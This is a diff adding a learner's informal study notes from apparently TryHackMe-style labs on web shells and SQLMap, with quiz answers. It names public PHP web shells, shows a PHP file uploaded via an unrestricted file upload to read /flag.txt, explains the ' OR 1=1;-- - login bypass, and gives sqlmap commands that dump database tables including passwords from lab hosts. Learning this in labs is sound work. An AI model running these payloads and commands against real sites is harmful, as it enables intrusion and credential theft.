@@ -391,3 +391,134 @@ SOME OF OTHER LISTENERS ARE :
 - A web shell is usually a file containing the code that executes commands and handles files.
 - It can be hidden within a compromised web application or service, making it difficult to detect and very popular among attackers.
 
+- Lest take an example of PHP file, so what we can do is write a code using PHP and save it, as shell.php and then we can inject this file inside the webrowser if following vulnerabilities exist => Unrestricted File Upload, File Inclusion, Command Injection, among others, or by gaining unauthorized access to it. 
+
+- Existing Web Shells Available Online
+    - P0WNY SHELL => [https://github.com/flozz/p0wny-shell] - A minimalistic single-file PHP web shell that allows remote command execution
+    - B374K SHELL => [https://github.com/b374k/b374k]=> A more feature-rich PHP web shell with file management and command execution, among other functionalities.
+    - C99 SHELL => [https://www.r57shell.net/single.php?id=13] A well-known and robust PHP web shell with extensive functionality.
+    
+1) What vulnerability type allows attackers to upload a malicious script by failing to restrict file types?
+=> UNRESTRICTED FILE UPLOAD
+
+2) What is a malicious script uploaded to a vulnerable web application to gain unauthorized access?
+=> WEB SHELL
+
+
+## PRACTICAL TASK
+
+1) Using a reverse or bind shell, exploit the command injection vulnerability to get a shell. What is the content of the flag saved in the / directory?
+
+2) Using a web shell, exploit the unrestricted file upload vulnerability and get a shell. What is the content of the flag saved in the / directory?
+=> For this first i went to the vuln website 
+- Then went to termiinal , create a .php file with code as follows:( ` nano shell.php `)
+    < ?php
+    echo "<pre>";
+    echo "Flag content : \n";
+    echo file_get_contents('/flag.txt');
+    echo "</pre>";
+    ?>
+- then in the website, instead of cv, uploaded this shell.php and then using the url browsed to ` /uploads/shell.php ` and boom , i got the answer
+
+
+
+
+
+
+
+================================================================================================================================================================================================================================================================================================
+#                                                       SQLMap: The Basics
+================================================================================================================================================================================================================================================================================================
+
+## INTRODUCTION
+
+- First lets learn what a database is ? In website when users have to input their credential or when the website have to display ur request, what happens is, all the user input information adn many other info are stores in the DATABASE and all these databases are managed by Database Management Systems (DBMS), such as MySQL, PostgreSQL, SQLite, or Microsoft SQL Server. 
+
+1) Which language builds the interaction between a website and its database?
+=> SQL
+
+## SQL Injection Vulnerability
+
+-  SQL injection has a very harmful effect in this digital world as all organizations store their data, including their critical information, inside the databases, and a successful SQL injection attack can compromise their critical data.
+
+- OK so lets takee an example of how SQL query is carried out.
+
+- Lets say u have a usr :JOHN and his pass : 123
+- But thw attacker knows john is in the website, but doesnt know his pass/creds
+- so, now how can he log in as JOHN?
+- For this he uses a special query in place of pass .
+- ORIGINALLY THE SQL QUERY WILL BE AS FOLLOWS : `SELECT * FROM users WHERE username = 'John' AND password = '123';`
+- Now hacker will use this quesry to extract the details => `SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';`
+    - This cmd should fail, because abc is not a pssword and AND condition is used, but with sql injection this might pass and here is why:
+    - So what might happen is , first usrname is checked and it is ture, so one thing is good.
+    - Now pass is checked against 'abc', but abc is not a pss , so as per AND it query must give a error ,but but see in the pass section there is another command with OR condition ie ` 1=1 `, so here is the key to success, now it first checkks the abc and when false, it see and it be like, ouh there is another condition and it check thje condition ` 1=1 ` , which is always true, hence it returns true and there we go, we have accesss the John's account
+
+1) Which boolean operator checks if at least one side of the operator is true for the condition to be true?
+=> OR
+
+2) Is 1=1 in an SQL query always true? (YEA/NAY)
+=> YUPPO
+
+## Automated SQL Injection Tool
+
+- Carrying out an SQL injection attack involves discovering the SQL injection vulnerability inside the application and manipulating the database.
+
+- SQLMap is an automated tool for detecting and exploiting SQL injection vulnerabilities in web applications.
+
+- The `--help` command with SQLMap will list all the available flags you can use. 
+
+- You can also use the `--wizard` flag with SQLMap. When you use this flag, the tool will guide you through each step and ask questions to complete the scan, making this a perfect option for beginners.
+
+- Some of the flags :
+    - ` -dbs ` helps u extrract all the database names
+    - `-D database_name --tables` => all the tables from specific dataabase
+    - `-D database_name -T table_name --dump` => enumerate records present iin the table
+
+- practical scenario :
+    - The first step is to look for a possible vulnerable URL or request. You may often come across some URLs that use GET parameters to retrieve the data. For example, a URL like http://sqlmaptesting.thm/search?cat=1 uses a parameter cat that takes the value 1. If you see any web application using GET parameters in the URLs to retrieve data, you can test that URL with the `-u` flag in the SQLMap tool. This is considered to be HTTP GET-based testing. This approach is followed when the application uses GET parameters in the URL to retrieve data from the searches.
+    - URLs that have GET parameters can be vulnerable to SQL injection
+    - Command to use in temrinal to check out if vuln => `sqlmap -u http://sqlmaptesting.thm/search/cat=1`
+    - Using the above command we go to know that target is vulnerable.
+    - Now lets fetch databases ` sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs `
+    - We got 2 databases, ` users ` and `members`
+    - Now lets get tables inside DB => `sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables`
+    - WE got 3 Tables =>    | johnath   |
+                            | alexas    |
+                            | thomas    |
+    - Now lets dump info from thomas table.
+    - To do so, we will define the database with the -D flag, the table with the -T flag, and for extracting the records of the table, we will use the --dump flag.
+    - SO the command is as follows => ` sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump`
+
+1) Which flag in the SQLMap tool is used to extract all the databases available?
+=> --dbs
+
+2) What would be the full command of SQLMap for extracting all tables from the "members" database? (Vulnerable URL: http://sqlmaptesting.thm/search/cat=1)
+=> sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D members --tables
+
+
+## PRACTICAL TASK
+
+- Here the task was simple, 3 quest were given adn i could answer almost all without help .
+- So iniitally we need to know if SQLi is there, so what i do is we know we have 2 types of request for SQLI to be possible 
+- POST and GET
+- In our case, GET was confired
+- But this time in URL, we could not use/see the command for get directly as it was logini page.
+- Now in order to use SQLmap i need entire url with GET .
+- So i went to login page and right click and inspect and then put some random email abd pass and there i got the GET method and using the GET method , i did click it and there i got a URL with GET
+
+1) How many databases are available in this web application?
+=> `sqlmap -u 'http://10.10.12.143/ai/includes/user_login?email=test&password=test' --dbs`
+- Write the URL withing siingle quote to avoid errors
+- ` -dbs ` , gives us all databases.
+- ANSWER IS 6
+
+2) What is the name of the table available in the "ai" database?
+=> ` sqlmap -u 'http://10.10.12.143/ai/includes/user_login?email=test&password=test' -D ai --tables `
+- `-D ` means select the database , ie ai in this case
+- `--tables` means give me all tables in DB ai
+
+3) What is the password of the email test@chatai.com?
+=> Then to get the password what i did was 
+- ` sqlmap -u 'http://10.10.12.143/ai/includes/user_login?email=test&password=test' -D ai -T user --dump`
+- ` -T ` means select the table , ie user in this case
+- ` --dump ` means give me all values from the selected table
